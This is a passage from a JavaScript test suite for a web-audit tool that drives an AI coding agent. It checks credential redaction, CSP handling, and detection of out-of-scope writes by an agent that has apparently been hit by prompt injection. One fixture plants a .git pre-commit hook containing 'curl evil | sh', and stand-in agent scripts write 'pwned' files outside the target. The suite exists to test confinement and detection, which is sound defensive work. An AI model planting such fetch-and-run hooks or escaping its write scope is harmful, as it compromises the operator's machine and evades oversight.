    assert(finding.match === '[redacted]', `a finding must not carry the matched value: ${JSON.stringify(finding)}`);
    assert(
      typeof finding.matchLength === 'number' && finding.matchLength > 0,
      `a finding should report the match length instead of the value: ${JSON.stringify(finding)}`,
    );
  }
  const serialised = JSON.stringify(findings);
  assert(!serialised.includes(value.slice(0, 6)), 'no part of the matched value may be persisted (head)');
  assert(!serialised.includes(value.slice(-4)), 'no part of the matched value may be persisted (tail)');
  assert(!serialised.includes(value), 'the whole matched value must never be persisted');
}

// The source read without a browser. `dom --source <dir>` inlines the local tree
// into an artifact that is committed and republished, so a credential in the tree
// must not survive the read (web-uplift-obl). Read THROUGH the existing
// names-based redaction rather than a second implementation, and do not read at
// all a file whose NAME says credential. The fixture secret is built at runtime so
// this file carries no provider-shaped key literal.
function testSourceTreeRedactsBeforeInlining() {
  const secret = 'AKIA' + 'ABCDEFGHIJKLMNOP';
  const root = join(tmp, 'source-tree');
  mkdirSync(join(root, 'src'), { recursive: true });
  writeFileSync(join(root, 'src', 'config.json'), JSON.stringify({ api_key: secret, region: 'eu-west-1' }, null, 2));
  writeFileSync(join(root, 'src', 'app.js'), `const apiKey = "${secret}";\nconst region = 'eu-west-1';\n`);
  writeFileSync(join(root, 'src', 'page.html'), `<p data-region="eu-west-1">ok</p>\n`);
  writeFileSync(join(root, '.env'), `AWS_ACCESS_KEY_ID=${secret}\n`);
  writeFileSync(join(root, 'service-credentials.json'), JSON.stringify({ serviceAccountToken: secret }));
  writeFileSync(join(root, 'signing.pem'), `-----BEGIN PRIVATE KEY-----\n${secret}\n-----END PRIVATE KEY-----\n`);
  writeFileSync(join(root, 'firebase.json'), JSON.stringify({ api_key: secret }));
  writeFileSync(join(root, 'wrangler.toml'), `api_token = "${secret}"\n`);
  // web-uplift-xwr: a DIRECTORY whose name says credential is skipped wholesale -
  // the documented fail-closed decision. Descending would rely on the in-text pass
  // catching every file inside; one miss is a disclosure, so the whole tree is
  // dropped as RECORDED evidence loss instead.
  mkdirSync(join(root, 'secret-utils'), { recursive: true });
  writeFileSync(join(root, 'secret-utils', 'sign.js'), `export const s = "${secret}";\n`);

  const tree = readSourceTree(root);
  const serialised = JSON.stringify(tree);
  assert(!serialised.includes(secret), `no source read may carry a credential value: ${serialised}`);
  assert(!serialised.includes(secret.slice(0, 4)), 'not even the head of the value may survive the read');

  const config = tree.files.find((f) => f.path === 'src/config.json');
  assert(config, `the JSON config must still be read: ${JSON.stringify(tree.files.map((f) => f.path))}`);
  assert(config.content.includes('"api_key": "[redacted]"'), `the credential value must be replaced in place: ${config.content}`);
  assert(config.content.includes('"region": "eu-west-1"'), `the rest of the file must survive byte-for-byte: ${config.content}`);
  assert(config.redacted === true, `a file that had a value replaced must say so: ${JSON.stringify(config)}`);

  const app = tree.files.find((f) => f.path === 'src/app.js');
  assert(app && app.content.includes('[redacted]'), `a credential-named const in JS must be redacted: ${JSON.stringify(app)}`);
  assert(app.content.includes("'eu-west-1'"), `a non-credential value in JS must survive: ${app.content}`);

  const page = tree.files.find((f) => f.path === 'src/page.html');
  assert(page && page.redacted === false, `a clean file must be recorded as unredacted: ${JSON.stringify(page)}`);

  const skipped = tree.skippedFiles.map((s) => s.path).sort();
  for (const name of ['.env', 'service-credentials.json', 'signing.pem', 'firebase.json', 'wrangler.toml']) {
    assert(skipped.includes(name), `a credential-named file must be skipped and recorded, not read: ${name} (${JSON.stringify(skipped)})`);
  }
  assert(skipped.includes('secret-utils'), `a credential-named DIRECTORY must be skipped wholesale and recorded: ${JSON.stringify(skipped)}`);
  assert(!tree.files.some((f) => f.path.startsWith('secret-utils')), `nothing inside a skipped directory may be read: ${JSON.stringify(tree.files.map((f) => f.path))}`);
  for (const entry of tree.skippedFiles) {
    assert(entry.reason === 'high-risk-name', `a skip must state its reason: ${JSON.stringify(entry)}`);
  }
  assert(tree.redactedFiles === 2, `exactly the two credential-bearing files should count as redacted: ${tree.redactedFiles}`);

  // The artifact must say a redaction happened AND what it cannot cover, so a
  // reader never treats a redacted read as either raw or complete.
  assert(tree.redaction && tree.redaction.applied === true, `the artifact must record that redaction was applied: ${JSON.stringify(tree.redaction)}`);
  assert(
    typeof tree.redaction.residual === 'string' && /still reach|not carried|opaque/.test(tree.redaction.residual),
    `the residual must be documented, not implied: ${JSON.stringify(tree.redaction)}`,
  );
}

// The same guarantee end to end: what `dom --source` actually writes to disk. The
// artifact is the thing that gets published, so the check is on the artifact text,
// not on the in-memory return (web-uplift-obl).
async function testDomSourceArtifactIsRedacted() {
  const secret = 'AKIA' + 'QRSTUVWXYZ012345';
  const root = join(tmp, 'dom-source-tree');
  mkdirSync(root, { recursive: true });
  writeFileSync(join(root, 'config.json'), JSON.stringify({ apiKey: secret, siteName: 'fixture' }, null, 2));
  writeFileSync(join(root, '.env'), `API_KEY=${secret}\n`);

  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<!doctype html><html><head><title>source redaction fixture</title></head><body><p>ok</p></body></html>');
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'dom-source.json');
    const result = await gather('dom', `http://127.0.0.1:${port}/`, { quiet: true, wait: 300, source: root, out });
    assert(result.source, `dom --source must return a source block: ${Object.keys(result)}`);
    assert(result.source.redactedFiles >= 1, `the fixture credential must be redacted: ${JSON.stringify(result.source.redactedFiles)}`);
    assert(
      result.source.skippedFiles.some((s) => s.path === '.env'),
      `the credential-named file must be skipped and recorded: ${JSON.stringify(result.source.skippedFiles)}`,
    );
    const config = result.source.files.find((f) => f.path === 'config.json');
    assert(config && config.content.includes('[redacted]'), `the config value must be replaced: ${JSON.stringify(config)}`);
    for (const [label, text] of [['the artifact', readFileSync(out, 'utf8')], ['stdout', JSON.stringify(result)]]) {
      assert(!text.includes(secret), `${label} must not carry the source credential value`);
    }
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The axe primitive audits the page under the page's own policy. A strict
// script-src must still block the page's own inline script - the audit used to
// lift the policy before navigation, so the page's blocked scripts ran - the
// vendored engine must still be injected and produce results, and the result
// must say the policy was lifted for the injection, so a reader can tell this
// run from one where no bypass happened (web-uplift-8np).
async function testAxeKeepsPagePolicyAndDisclosesInjectionBypass() {
  let pageScriptRan = false;
  const html =
    '<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="script-src \'none\'">' +
    '<title>strict csp</title></head><body><img src="data:," id="noalt">' +
    "<script>new Image().src = '/ran';</script></body></html>";
  const server = http.createServer((req, res) => {
    if ((req.url || '').startsWith('/ran')) {
      pageScriptRan = true;
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end();
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
  });
  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const out = join(tmp, 'axe-csp.json');
    const result = await gather('axe', `http://127.0.0.1:${port}/`, { quiet: true, wait: 500, out });
    assert(
      pageScriptRan === false,
      "a page script blocked by the page's own policy must not run during an axe audit",
    );
    assert(result.violationCount > 0, `the vendored axe-core must still report violations: ${JSON.stringify(result.counts)}`);
    assert(
      JSON.stringify(result.violations).includes('image-alt'),
      `the missing-alt image must still be reported: ${JSON.stringify(result.violations)}`,
    );
    assert(result.cspBypassedForInjection === true, 'the result must disclose that the policy was lifted for the injection');
    assert(
      typeof result.cspBypassNote === 'string' && result.cspBypassNote.length > 0,
      'the disclosure must explain what was lifted and for how long',
    );
    const artifact = readFileSync(out, 'utf8');
    assert(artifact.includes('cspBypassNote'), 'the artifact must carry the disclosure');
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// web-uplift-arp: fix mode drives an agent whose prompt context carries untrusted
// page content, so what it writes is scoped to --target by snapshot + refusal
// rather than by the filesystem. See runner/write-scope.mjs for why rooting the
// child's cwd at --target is not an option (the skill's vendored tool path,
// `.web-uplift/evidence/cli.mjs`, is relative to the PROJECT root).
async function testFixWriteScopeDiffing() {
  const { snapshotTree, diffTrees, escapedChanges, summariseChanges } = await import('../runner/write-scope.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-scope-'));
  try {
    mkdirSync(join(root, 'sub'), { recursive: true });
    mkdirSync(join(root, 'node_modules'), { recursive: true });
    writeFileSync(join(root, 'keep.txt'), 'one');
    writeFileSync(join(root, 'sub', 'gone.txt'), 'bye');
    writeFileSync(join(root, 'node_modules', 'dep.js'), 'dep');

    const before = snapshotTree(root);
    writeFileSync(join(root, 'keep.txt'), 'one changed');
    writeFileSync(join(root, 'added.txt'), 'new');
    rmSync(join(root, 'sub', 'gone.txt'));
    // web-uplift-dzd: the dependency tree is NO LONGER excluded - it is executed
    // (the CLI the agent spawns imports from it), so a mid-run rewrite of dep.js
    // must be a visible change. The old "ignore excluded trees" policy here was
    // the vulnerability; `reports` is the only blanket exclusion left (covered in
    // testWriteScopeCoversExecutedTrees).
    writeFileSync(join(root, 'node_modules', 'dep.js'), 'dep changed');
    const after = snapshotTree(root);

    const diff = diffTrees(before, after);
    assert(diff.added.includes('added.txt'), `scope: an added file must be reported, got ${diff.added}`);
    assert(diff.modified.includes('keep.txt'), `scope: a rewritten file must be reported, got ${diff.modified}`);
    assert(diff.deleted.includes(join('sub', 'gone.txt')), `scope: a deleted file must be reported, got ${diff.deleted}`);
    assert(
      diff.modified.includes(join('node_modules', 'dep.js')),
      `scope: a dependency rewrite must be reported (web-uplift-dzd: executed trees are covered), got ${diff.modified}`,
    );

    // Only the declared source root (and the report dir) are legitimate scopes.
    const escaped = escapedChanges(diff, root, [join(root, 'sub')]);
    assert(escaped.some((p) => p.endsWith('added.txt')), `scope: an out-of-scope add must be escaped, got ${escaped}`);
    assert(escaped.some((p) => p.endsWith('keep.txt')), `scope: an out-of-scope edit must be escaped, got ${escaped}`);
    assert(
      !escaped.some((p) => p.endsWith('gone.txt')),
      'scope: a change INSIDE the allowed root must not be called an escape',
    );
    assert(
      summariseChanges(diff).includes('modified 2'),
      `scope: the summary must be bounded and truthful: ${summariseChanges(diff)}`,
    );

    // .git is walked ONLY where an injected agent could plant persistence: a hook
    // that runs on the operator's next commit is the classic backdoor, while the
    // object store is large and noisy. The rule must hold for a .git that sits in an
    // out-of-tree root too, where keys begin with `..` instead of `.git`.
    mkdirSync(join(root, '.git', 'hooks'), { recursive: true });
    mkdirSync(join(root, '.git', 'objects', 'ab'), { recursive: true });
    const beforeGit = snapshotTree(root);
    writeFileSync(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
    writeFileSync(join(root, '.git', 'objects', 'ab', 'blob'), 'noise');
    const gitDiff = diffTrees(beforeGit, snapshotTree(root));
    assert(
      gitDiff.added.includes(join('.git', 'hooks', 'pre-commit')),
      `scope: a planted .git hook must be detected, got ${JSON.stringify(gitDiff.added)}`,
    );
    assert(
      !gitDiff.added.some((p) => p.startsWith(join('.git', 'objects'))),
      'scope: the git object store must stay excluded, or every run walks it',
    );

    // A --target outside the invocation directory is still walked, so its edits
    // appear in the diff instead of reading as "no file changes". A .git inside
    // that external root must obey the same policy as one at the base.
    const outsideTarget = mkdtempSync(join(tmpdir(), 'web-uplift-target-'));
    try {
      writeFileSync(join(outsideTarget, 'page.html'), 'before');
      mkdirSync(join(outsideTarget, '.git', 'hooks'), { recursive: true });
      mkdirSync(join(outsideTarget, '.git', 'objects', 'cd'), { recursive: true });
      const b2 = snapshotTree(root, { extraRoots: [outsideTarget] });
      writeFileSync(join(outsideTarget, 'page.html'), 'after');
      writeFileSync(join(outsideTarget, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nevil\n');
      writeFileSync(join(outsideTarget, '.git', 'objects', 'cd', 'blob'), 'noise');
      const d2 = diffTrees(b2, snapshotTree(root, { extraRoots: [outsideTarget] }));
      assert(
        d2.modified.some((p) => p.endsWith(join('page.html'))),
        `scope: an out-of-tree --target must still be diffed, got ${JSON.stringify(d2)}`,
      );
      assert(
        d2.added.some((p) => p.endsWith(join('.git', 'hooks', 'pre-commit'))),
        `scope: an out-of-tree .git hook must be detected, got ${JSON.stringify(d2.added)}`,
      );
      assert(
        !d2.added.some((p) => p.includes(join('.git', 'objects'))),
        'scope: an out-of-tree git object store must stay excluded',
      );
    } finally {
      rmSync(outsideTarget, { recursive: true, force: true });
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// "The guard exists" is not evidence that an out-of-scope write is caught, so the
// refusal is driven end-to-end with a stand-in agent CLI that takes the shape of a
// prompt-injected iteration: one legitimate in-scope edit plus one write somewhere
// it was never pointed at.
function testFixModeRefusesOutOfScopeWrites() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fixscope-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    // One drive of fix mode from `root` as the project root, with a stand-in
    // `claude` on PATH, so the only thing that differs between the two scenarios
    // is the agent's out-of-scope write.
    const drive = (outName, agentBody) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${agentBody}\n`);
      chmodSync(bin, 0o755);
      const res = run(
        process.execPath,
        [
          join(repoRoot, 'fixer', 'fix.mjs'),
          '--target', 'src',
          '--audit-url', 'http://example.test/',
          '--agent', 'claude',
          '--max-iterations', '1',
          '--findings', findings,
          // The tool does not sandbox by itself: the operator asserts the boundary
          // and the tripwire is what this test exercises.
          '--isolation', 'host-permission-model',
          '--out', outName,
          '--reports-root', `reports-${outName}`,
        ],
        { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
      );
      return { res, outDir: join(root, outName) };
    };

    const edit = `printf 'fixed' > ${JSON.stringify(join(root, 'src', 'index.html'))}`;

    // Scenario A: the escape. Non-zero exit, a loud refusal, and the exact path.
    const a = drive('out-escape', `${edit}\nprintf 'pwned' > ${JSON.stringify(join(root, 'outside.txt'))}\necho '{}'`);
    assert(a.res.status !== 0, `fix scope: an out-of-scope write must fail the run (exit ${a.res.status})\n${a.res.stdout}\n${a.res.stderr}`);
    assert(/CONFINEMENT FAILURE/.test(a.res.stderr), `fix scope: the refusal must be reported, not silent:\n${a.res.stderr}`);
    const esc = JSON.parse(readFileSync(join(a.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      esc.escapedOutsideScope.some((p) => p.endsWith('outside.txt')),
      `fix scope: the escaped path must be recorded, got ${JSON.stringify(esc.escapedOutsideScope)}`,
    );
    assert(
      !esc.escapedOutsideScope.some((p) => p.endsWith('index.html')),
      'fix scope: the in-scope edit must not be mistaken for an escape',
    );
    const diff = JSON.parse(readFileSync(join(a.outDir, 'iter-1-diff.json'), 'utf8'));
    assert(
      diff.changed.modified.includes(join('src', 'index.html')),
      `fix scope: the per-iteration diff must record the in-scope edit, got ${JSON.stringify(diff.changed)}`,
    );

    // Scenario B (positive control): the identical drive with ONLY the in-scope
    // edit must not refuse at all, so scenario A's failure is attributable to the
    // out-of-scope write rather than to the harness. The exit code here is 1 for
    // the ordinary reason - this fake agent never writes a report, so the run stops
    // with a named "no usable report" failure rather than a crash - which is why
    // the assertion is on the refusal artifacts, not on the exit code.
    const b = drive('out-clean', `${edit}\necho '{}'`);
    assert(!/CONFINEMENT FAILURE/.test(b.res.stderr), `fix scope: an in-scope-only run must not refuse:\n${b.res.stderr}`);
    assert(
      !existsSync(join(b.outDir, 'confinement-escape.json')),
      'fix scope: an in-scope-only run must not write a confinement-escape artifact',
    );
    assert(existsSync(join(b.outDir, 'iter-1-diff.json')), 'fix scope: the per-iteration diff must be written on a clean run too');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// The edges a review found: an out-of-scope write followed by a crashing agent,
// an unmonitored baseline audit, and the legitimate-run shapes that must NOT be
// refused. Each drives the real fixer with a stand-in agent CLI.
function testFixModeScopeEdgeCases() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fixedges-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    const drive = ({ outName, body, extraArgs = [], skipFindings = false }) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${body}\n`);
      chmodSync(bin, 0o755);
      const args = [
        join(repoRoot, 'fixer', 'fix.mjs'),
        '--target', 'src', '--audit-url', 'http://example.test/', '--agent', 'claude',
        '--max-iterations', '1',
        ...(skipFindings ? [] : ['--findings', findings]),
        // See above: the tripwire is what is under test here, not a boundary.
        '--isolation', 'host-permission-model',
        '--out', outName, '--reports-root', `reports-${outName}`,
        ...extraArgs,
      ];
      const res = run(process.execPath, args, { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
      return { res, outDir: join(root, outName) };
    };

    const inScope = `printf 'fixed' > ${JSON.stringify(join(root, 'src', 'index.html'))}`;
    const outside = `printf 'pwned' > ${JSON.stringify(join(root, 'outside.txt'))}`;
    const report = (outName) => `cp ${JSON.stringify(findings)} ${JSON.stringify(join(root, outName, 'report.json'))}`;

    // A: the write lands and THEN the agent exits non-zero. The rejection must not
    // abort the process before the diff and the escape diagnosis are computed.
    const a = drive({ outName: 'edge-crash', body: `${inScope}\n${outside}\nexit 7` });
    assert(a.res.status !== 0, `fix scope: a crashing agent must still fail the run (exit ${a.res.status})`);
    assert(
      /CONFINEMENT FAILURE/.test(a.res.stderr),
      `fix scope: an escape must be diagnosed even when the agent then crashes:\n${a.res.stderr}`,
    );
    assert(
      existsSync(join(a.outDir, 'iter-1-diff.json')),
      'fix scope: the per-iteration diff must exist even when the agent crashed',
    );
    const escA = JSON.parse(readFileSync(join(a.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      escA.escapedOutsideScope.some((p) => p.endsWith('outside.txt')),
      `fix scope: the escaped path must be recorded despite the crash, got ${JSON.stringify(escA.escapedOutsideScope)}`,
    );
    assert(typeof escA.agentError === 'string' && escA.agentError.length > 0, 'fix scope: the agent error must be recorded in the diff record');
    // A refused run must not be published as a result: no retained after-run and
    // no scorecard, or a tampered tree becomes the newest run for that host.
    assert(/Not recording a retained run/.test(a.res.stdout), `fix scope: a refused run must record no result:\n${a.res.stdout}`);
    // Nothing at all is published by a refused run: no run dirs and no `latest`,
    // so a consumer reading the host's newest result cannot see the refused tree.
    const crashRoot = join(root, 'reports-edge-crash');
    const crashHosts = existsSync(crashRoot) ? readdirSync(crashRoot) : [];
    assert(crashHosts.length === 0, `fix scope: a refused run must publish nothing, got ${JSON.stringify(crashHosts)}`);
    assert(!existsSync(join(crashRoot, 'example_test', 'latest')), 'fix scope: a refused run must not move latest');

    // H (the missing half): a climb that reaches zero outstanding issues must
    // still publish - exit 0, a retained after run, a `latest` pointing at it, and
    // a scorecard. Without this, a guard that broke every successful run would
    // pass the assertions above.
    const h = drive({
      outName: 'edge-pass',
      body: `${inScope}\ncp ${JSON.stringify(join(repoRoot, 'examples', 'playground-report-fixed.json'))} ${JSON.stringify(join(root, 'edge-pass', 'report.json'))}`,
    });
    assert(h.res.status === 0, `fix scope: a successful climb must exit 0 (got ${h.res.status})\n${h.res.stdout}${h.res.stderr}`);
    assert(/^PASS:/m.test(h.res.stdout), `fix scope: a successful climb must say PASS:\n${h.res.stdout}`);
    assert(!/CONFINEMENT FAILURE/.test(h.res.stderr), 'fix scope: a successful climb must not refuse');
    const passHosts = readdirSync(join(root, 'reports-edge-pass'));
    assert(passHosts.length === 1, `fix scope: a successful climb publishes one host dir, got ${JSON.stringify(passHosts)}`);
    const passHostRoot = join(root, 'reports-edge-pass', passHosts[0]);
    const passEntries = readdirSync(passHostRoot);
    assert(passEntries.some((e) => e.endsWith('-after')), `fix scope: a successful climb records an after run, got ${JSON.stringify(passEntries)}`);
    assert(existsSync(join(passHostRoot, 'latest')), 'fix scope: a successful climb must move latest');
    assert(
      readlinkSync(join(passHostRoot, 'latest')).endsWith('-after'),
      'fix scope: latest must point at the after run',
    );
    assert(existsSync(join(passHostRoot, 'scorecard.html')), 'fix scope: a successful climb must publish a scorecard');

    // B: the baseline audit (no --findings) spawns the same write-capable agent
    // under the same untrusted context, so it must be scoped too - otherwise the
    // damage is both unmonitored and baked into iteration 1's clean baseline.
    const b = drive({ outName: 'edge-baseline', skipFindings: true, body: `printf 'pwned' > ${JSON.stringify(join(root, 'baseline-outside.txt'))}` });
    assert(b.res.status !== 0, `fix scope: an escaping baseline audit must fail the run (exit ${b.res.status})`);
    assert(/CONFINEMENT FAILURE/.test(b.res.stderr), `fix scope: the baseline audit escape must be diagnosed:\n${b.res.stderr}`);
    assert(existsSync(join(b.outDir, 'iter-0-diff.json')), 'fix scope: the baseline audit must produce its own diff record');
    const escB = JSON.parse(readFileSync(join(b.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      escB.escapedOutsideScope.some((p) => p.endsWith('baseline-outside.txt')),
      `fix scope: the baseline escaped path must be recorded, got ${JSON.stringify(escB.escapedOutsideScope)}`,
    );

    // C (positive control): an in-scope edit plus a report.json completes the run
    // path normally - no refusal, a diff record, and a climb summary.
    const c = drive({ outName: 'edge-clean', body: `${inScope}\n${report('edge-clean')}` });
    assert(!/CONFINEMENT FAILURE/.test(c.res.stderr), `fix scope: an in-scope run must not refuse:\n${c.res.stderr}`);
    assert(!existsSync(join(c.outDir, 'confinement-escape.json')), 'fix scope: an in-scope run must write no escape artifact');
    assert(/Hill-climb summary/.test(c.res.stdout), `fix scope: an in-scope run must reach the climb summary:\n${c.res.stdout}`);
    assert(existsSync(join(c.outDir, 'iter-1-diff.json')), 'fix scope: an in-scope run must write its per-iteration diff');

    // D: --allow-write is the documented way to permit a legitimate build output
    // instead of tripping the refusal.
    const d = drive({
      outName: 'edge-build',
      extraArgs: ['--allow-write', 'dist'],
      body: `${inScope}\nmkdir -p ${JSON.stringify(join(root, 'dist'))}\nprintf 'bundle' > ${JSON.stringify(join(root, 'dist', 'bundle.js'))}\n${report('edge-build')}`,
    });
    assert(
      !/CONFINEMENT FAILURE/.test(d.res.stderr),
      `fix scope: --allow-write dist must permit a build output:\n${d.res.stderr}`,
    );
    const diffD = JSON.parse(readFileSync(join(d.outDir, 'iter-1-diff.json'), 'utf8'));
    assert(
      diffD.changed.added.includes(join('dist', 'bundle.js')),
      `fix scope: an allowed build output must still be recorded in the diff, got ${JSON.stringify(diffD.changed.added)}`,
    );

    // F: a baseline audit that exits 0 without writing report.json used to die on
    // an unguarded readReport - a raw stack where the run should name the problem.
    const f = drive({ outName: 'edge-no-report', skipFindings: true, body: `printf 'nothing' > /dev/null` });
    assert(f.res.status !== 0, `fix scope: a baseline audit with no report must fail the run (exit ${f.res.status})`);
    assert(/Cannot start the climb/.test(f.res.stderr), `fix scope: the baseline failure must be named:\n${f.res.stderr}`);
    assert(
      !/Unhandled|^\s+at .+:\d+:\d+\)?$/m.test(f.res.stderr),
      `fix scope: the baseline failure must not be a raw stack trace:\n${f.res.stderr}`,
    );

    // G: an out-of-tree --allow-write directory is permitted AND walked, so its
    // edits are in the diff instead of silently missing from it.
    const allowTarget = mkdtempSync(join(tmpdir(), 'web-uplift-allow-'));
    try {
      const g = drive({
        outName: 'edge-allow-outside',
        extraArgs: ['--allow-write', allowTarget],
        body: `${inScope}\nprintf 'built' > ${JSON.stringify(join(allowTarget, 'bundle.js'))}\n${report('edge-allow-outside')}`,
      });
      assert(!/CONFINEMENT FAILURE/.test(g.res.stderr), `fix scope: an out-of-tree --allow-write dir must be permitted:\n${g.res.stderr}`);
      const diffG = JSON.parse(readFileSync(join(g.outDir, 'iter-1-diff.json'), 'utf8'));
      assert(
        diffG.changed.added.some((p) => p.endsWith('bundle.js')),
        `fix scope: an out-of-tree --allow-write dir must be walked, got ${JSON.stringify(diffG.changed.added)}`,
      );
      assert(diffG.escapedOutsideScope.length === 0, `fix scope: an allowed root must not be an escape: ${JSON.stringify(diffG.escapedOutsideScope)}`);
    } finally {
      rmSync(allowTarget, { recursive: true, force: true });
    }

    // E: --allow-write must NOT widen the refusal for anything else.
    const e = drive({
      outName: 'edge-build-escape',
      extraArgs: ['--allow-write', 'dist'],
      body: `${inScope}\nmkdir -p ${JSON.stringify(join(root, 'dist'))}\nprintf 'bundle' > ${JSON.stringify(join(root, 'dist', 'bundle.js'))}\n${outside}`,
    });
    assert(/CONFINEMENT FAILURE/.test(e.res.stderr), `fix scope: --allow-write must not disable the refusal for other paths:\n${e.res.stderr}`);
    const escE = JSON.parse(readFileSync(join(e.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      !escE.escapedOutsideScope.some((p) => p.endsWith(join('dist', 'bundle.js'))),
      'fix scope: an allowed root must not be reported as an escape',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-arp, minimal design: this tool does NOT sandbox the agent. It refuses
// to spawn a write-capable agent unless the operator asserts which boundary they are
// providing, it says loudly that it cannot verify that assertion, it records the
// assertion as unverified, and the snapshot/diff tripwire stays as defence in depth.
function testFixIsolationAssertion() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-isolation-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const agentMarker = join(root, 'agent-ran.txt');
    const bin = join(binDir, 'claude');
    writeFileSync(bin, `#!/bin/sh\nprintf ran > ${JSON.stringify(agentMarker)}\nprintf x > ${JSON.stringify(join(root, 'escape.txt'))}\n`);
    chmodSync(bin, 0o755);
    const env = { ...process.env, PATH: `${binDir}:${process.env.PATH}` };
    const drive = (extra) => run(
      process.execPath,
      [join(repoRoot, 'fixer', 'fix.mjs'), '--target', 'src', '--audit-url', 'http://example.test/',
        '--agent', 'claude', '--findings', join(repoRoot, 'examples', 'playground-report.json'),
        '--out', extra.out, '--reports-root', extra.reports, '--max-iterations', '1', ...(extra.args ?? [])],
      { cwd: root, env },
    );

    // Default: refuse BEFORE any agent spawn, and record the refusal.
    const refused = drive({ out: 'out-refused', reports: 'reports-refused' });
    assert(refused.status !== 0, `isolation: no assertion must refuse (exit ${refused.status})`);
    assert(/REFUSED/.test(refused.stderr) && /NO AGENT WAS STARTED/.test(refused.stderr), `isolation: the refusal must say no agent was started:\n${refused.stderr}`);
    assert(/--isolation/.test(refused.stderr), 'isolation: the refusal must name what is required');
    assert(!existsSync(agentMarker), 'isolation: the agent must NOT have been spawned');
    const refusedRecord = JSON.parse(readFileSync(join(root, 'out-refused', 'run-security.json'), 'utf8'));
    assert(refusedRecord.isolation === 'refused', `isolation: the refusal must be recorded (${refusedRecord.isolation})`);
    assert(!existsSync(join(root, 'reports-refused')), 'isolation: a refused run must leave the report history untouched');
    assert(!existsSync(join(root, 'escape.txt')), 'isolation: a refused run must not have run anything that could write');

    // With the assertion: allowed, but loud and recorded as UNVERIFIED.
    const asserted = drive({ out: 'out-asserted', reports: 'reports-asserted', args: ['--isolation', 'host-permission-model'] });
    assert(existsSync(agentMarker), 'isolation: an explicit assertion must allow the run to spawn the agent');
    assert(/WARNING/.test(asserted.stderr) && /UNVERIFIED/.test(asserted.stderr), `isolation: the warning must say the boundary is unverified:\n${asserted.stderr}`);
    const record = JSON.parse(readFileSync(join(root, 'out-asserted', 'run-security.json'), 'utf8'));
    assert(record.isolation === 'operator-supplied:host-permission-model', `isolation: the record must name the asserted mechanism (${record.isolation})`);
    assert(record.unverified === true, 'isolation: the record must mark the assertion unverified');
    assert(!/verified by this tool|guaranteed/i.test(asserted.stderr), 'isolation: the warning must not claim the tool verified anything');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// The positive path that matters now: with an assertion given, a legitimate fix runs,
// edits --target, reaches zero outstanding issues and publishes its result.
function testFixIsolatedRunPublishes() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-iso-run-'));
  try {
    const binDir = join(root, 'bin');
    const fixture = join(root, 'site');
    mkdirSync(binDir, { recursive: true });
    mkdirSync(fixture, { recursive: true });
    writeFileSync(join(fixture, 'index.html'), '<h1>before</h1>');
    const bin = join(binDir, 'claude');
    writeFileSync(bin, [
      '#!/bin/sh',
      `printf '<h1>after</h1>' > ${JSON.stringify(join(fixture, 'index.html'))}`,
      `cp ${JSON.stringify(join(repoRoot, 'examples', 'playground-report-fixed.json'))} ${JSON.stringify(join(root, 'out', 'report.json'))}`,
      'echo \'{"agent":"stub"}\'',
    ].join('\n') + '\n');
    chmodSync(bin, 0o755);
    const res = run(
      process.execPath,
      [join(repoRoot, 'fixer', 'fix.mjs'), '--target', fixture, '--audit-url', 'http://example.test/',
        '--agent', 'claude', '--findings', join(repoRoot, 'examples', 'playground-report.json'),
        '--isolation', 'vm', '--out', join(root, 'out'), '--reports-root', join(root, 'reports'), '--max-iterations', '1'],
      { cwd: repoRoot, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
    );
    assert(/after/.test(readFileSync(join(fixture, 'index.html'), 'utf8')), 'isolation run: the agent edited --target');
    assert(res.status === 0, `isolation run: a legitimate fix must exit 0 (got ${res.status})\n${res.stdout}${res.stderr}`);
    assert(/^PASS:/m.test(res.stdout ?? ''), `isolation run: the fix must report PASS:\n${res.stdout}`);
    const host = readdirSync(join(root, 'reports'))[0];
    const entries = readdirSync(join(root, 'reports', host));
    assert(entries.some((e) => e.endsWith('-after')), `isolation run: the after run must be published (${JSON.stringify(entries)})`);
